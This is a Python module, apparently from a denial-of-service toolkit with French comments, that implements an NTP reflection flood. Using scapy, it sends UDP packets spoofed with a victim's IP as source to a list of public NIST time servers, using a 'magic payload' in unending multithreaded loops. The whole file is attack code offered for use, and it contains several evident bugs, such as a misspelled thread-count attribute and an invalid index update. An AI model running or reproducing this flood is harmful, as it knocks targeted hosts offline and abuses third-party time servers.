"""
ntp Layer 4 attack 
@azseza
used by the main program
"""
from scapy.all import Raw, send
from scapy.layers.inet import IP, UDP
import sys
import threading
import time
import random
import multiprocessing
from ipaddress import IPv4Address
from .validators import *
"""
Ce programme execute une NTP DoS attack autant qu'un stand alone process
IL FAUT QUE LE NOMBRE DE THREAD SOIT SUPERIEUR AU NOMBRE DE SERVEURS
Principe : 
    Principalment on va emmerger la cible par des paquets UDP en utilisant les serveurs ntp
    et leurs protocle respectifs en recréant les paquets qu'ils transmettent d'habitude.
"""

class NtpFlood(multiprocessing.Process):
    """
    Ntp flood attack as a class/process to be used in the main program
    """
    def __init__(self):
        """
        Init the attack , and override the process class to
        make sure the process runs as stand alone procces that will handle
        it's own threads
        """
        multiprocessing.Process.__init__(self)
        self.numberOfThreads = 5
        self.data = "\x17\x00\x03\x2a" + "\x00" * 4  #magic payload <3 <3 
        self.ntplist = ['time-a-g.nist.gov', 'time-b-g.nist.gov', 'time-c-g.nist.gov',
                        'time-d-g.nist.gov', 'time-d-g.nist.gov', 'time-e-g.nist.gov',
                        'time-e-g.nist.gov', 'time-a-b.nist.gov', 'time-b-b.nist.gov',
                        'time-c-b.nist.gov', 'time-d-b.nist.gov', 'time-d-b.nist.gov']
        self.index = 0
        self.target = None

    def setArgs(self):
        """
        calling the class will intitiate it with the question asking stuff 
        """
        questions = [
            {
                'type': 'input',
                'name': 'target',
                'message': 'IP of the Target(needs to be an ip address) :',
                'validate': TargetValidator 
            },
            {
                'type': 'input',
                'name': 'thrdz',
                'message': 'number Of threads',
                'validate': IntValidator
            }
        ]
        answers = prompt(questions, style=style)
        self.target = answers.get("target")
        self.nuberOfThreads = answers.get("thrdz")

    def makePackets(self):
        """
        function that construuts a load of Packets
        """
        ntpserver = self.ntplist[self.index]
        packet = IP(dst=ntpserver, src=self.target) / UDP(sport=48947, dport=1598) / Raw(load=self.data)
        send(packet, loop=1)
        # Pour ne pas avoir un IndexError
        self.index.value = (self.index + 1) % 12

    def run(self):
        """
        function that Runs the flooding procces
        """
        try:
            threads = []
            print("Ctrl + C to stop the attack !! =)")
            print("Starting the attack ...")
            print("Starting to flood: "+ str(self.target) + " using NTP list: " + str(self.ntplist) + " With " + str(self.numberOfThreads) + " threads")
            while True:
                for t in range(self.numberOfThreads):
                    try:
                        thread = threading.Thread(target=self.makePackets)
                        thread.start()
                        threads.append(thread) 
                    except PermissionError:
                        print("You nee to be root to do this .. ")
                        break
        except KeyboardInterrupt:
            for thread in threads:
                thread.kill()

